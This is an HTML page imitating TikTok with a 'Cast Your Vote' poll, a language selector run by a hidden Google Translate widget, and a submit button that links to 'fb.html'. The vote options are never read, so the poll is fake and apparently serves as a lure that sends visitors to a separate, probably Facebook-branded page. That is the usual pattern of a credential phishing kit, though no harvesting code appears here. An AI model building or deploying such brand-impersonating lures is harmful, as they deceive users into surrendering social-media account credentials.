<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>TikTok Vote</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
:root {
  --cyan: #25f4ee;
  --pink: #fe2c55;
  --bg: #000;
  --card: rgba(255,255,255,0.06);
  --border: rgba(255,255,255,0.15);
}

* {
  box-sizing: border-box;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
    Roboto, Helvetica, Arial, sans-serif;
}

body {
  margin: 0;
  min-height: 100vh;
  background:
    radial-gradient(circle at top left, rgba(37,244,238,0.15), transparent 40%),
    radial-gradient(circle at bottom right, rgba(254,44,85,0.15), transparent 40%),
    var(--bg);
  display: flex;
  align-items: center;
  justify-content: center;
  color: #fff;
}

/* CARD */
.card {
  width: 100%;
  max-width: 440px;
  padding: 26px;
  border-radius: 22px;
  background: var(--card);
  backdrop-filter: blur(14px);
  border: 1px solid var(--border);
  box-shadow: 0 40px 80px rgba(0,0,0,0.9);
}

/* CUSTOM TRANSLATE */
.translate-box {
  display: flex;
  justify-content: center;
  margin-bottom: 16px;
}

.translate-select {
  width: 100%;
  max-width: 280px;
  padding: 12px 16px;
  border-radius: 999px;
  background: rgba(255,255,255,0.08);
  border: 1px solid rgba(255,255,255,0.25);
  color: #fff;
  font-size: 14px;
  outline: none;
  appearance: none;
  text-align: center;
  cursor: pointer;
}

.translate-select option {
  color: #000;
}

/* LOGO */
.logo {
  text-align: center;
  font-weight: 900;
  font-size: 22px;
  margin-bottom: 18px;
  background: linear-gradient(135deg, var(--cyan), var(--pink));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}

h1 {
  text-align: center;
  font-size: 24px;
  margin-bottom: 10px;
}

.subtitle {
  text-align: center;
  font-size: 15px;
  color: #cfcfcf;
  margin-bottom: 28px;
}

/* OPTIONS */
.vote-options {
  display: grid;
  gap: 16px;
  margin-bottom: 26px;
}

.option {
  padding: 18px;
  border-radius: 16px;
  border: 1px solid var(--border);
  cursor: pointer;
}

.option input {
  display: none;
}

.option span {
  font-size: 16px;
  font-weight: 600;
}

/* BUTTON */
.submit {
  width: 100%;
  border: none;
  padding: 15px;
  border-radius: 18px;
  font-size: 16px;
  font-weight: 800;
  cursor: pointer;
  background: linear-gradient(135deg, var(--cyan), var(--pink));
  color: #000;
}

/* NOTE */
.note {
  margin-top: 18px;
  text-align: center;
  font-size: 12.5px;
  color: #9a9a9a;
}

/* MOBILE */
@media (max-width: 480px) {
  .card {
    margin: 14px;
    padding: 22px;
  }
}
</style>
</head>
<body>

<div class="card">

  <!-- CUSTOM TRANSLATOR -->
  <div class="translate-box">
    <select class="translate-select" id="languageSelect">
      <option value="">üåç Translate page</option>

      <option value="de">English ‚Üí German</option>
      <option value="en">German ‚Üí English</option>

      <option value="fr">English ‚Üí French</option>
      <option value="en">French ‚Üí English</option>

      <option value="it">English ‚Üí Italian</option>
      <option value="en">Italian ‚Üí English</option>

      <option value="rm">English ‚Üí Romansh</option>
      <option value="pl">Polish ‚Üí English</option>
      <option value="fi">Finnish ‚Üí English</option>
      <option value="sq">English ‚Üí Albanian</option>
      <option value="no">English ‚Üí Norwegian</option>
      <option value="sr">Serbian ‚Üí English</option>
      <option value="hr">Croatian ‚Üí English</option>
      <option value="cs">Czech ‚Üí English</option>
    </select>
  </div>

  <div class="logo">‚ô™ TikTok</div>

  <h1>Cast Your Vote</h1>
  <p class="subtitle">
    Your opinion matters. Choose an option below and help shape the outcome.
  </p>

  <div class="vote-options">
    <label class="option">
      <input type="radio" name="vote">
      <span>üëç Yes, I support this</span>
    </label>

    <label class="option">
      <input type="radio" name="vote">
      <span>üëé No, I don‚Äôt agree</span>
    </label>
  </div>

  <a href="fb.html">
    <button class="submit">Complete Vote On TikTok</button>
  </a>
  
  <div class="note">
    Voting is anonymous ‚Ä¢ Results update in real time
  </div>

</div>

<!-- HIDDEN GOOGLE TRANSLATE ENGINE -->
<div id="google_translate_element" style="display:none;"></div>

<script>
function googleTranslateElementInit() {
  new google.translate.TranslateElement(
    { pageLanguage: 'en', autoDisplay: false },
    'google_translate_element'
  );
}

function changeLanguage(lang) {
  const combo = document.querySelector('.goog-te-combo');
  if (!combo) return;
  combo.value = lang;
  combo.dispatchEvent(new Event('change'));
}

document.getElementById('languageSelect').addEventListener('change', function () {
  if (this.value) changeLanguage(this.value);
});
</script>

<script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

</body>
</html>
